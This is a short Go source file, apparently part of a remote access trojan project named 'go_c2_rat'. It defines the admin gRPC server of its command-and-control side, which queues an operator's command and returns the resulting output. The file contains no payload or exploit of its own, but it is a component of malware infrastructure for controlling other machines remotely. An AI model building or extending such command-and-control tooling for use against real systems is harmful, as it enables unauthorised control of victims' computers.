package admin

import (
	"context"

	"github.com/jonaserhart/go_c2_rat/pkg/pb"
)

type adminServer struct {
	pb.UnimplementedAdminServer
	work, output chan *pb.Command
}

func NewAdminServer(work, output chan *pb.Command) *adminServer {
	return &adminServer{work: work, output: output}
}

func (s *adminServer) RunCommand(ctx context.Context, cmd *pb.Command) (*pb.Command, error) {
	var res *pb.Command
	go func() {
		s.work <- cmd
	}()
	res = <-s.output
	return res, nil
}
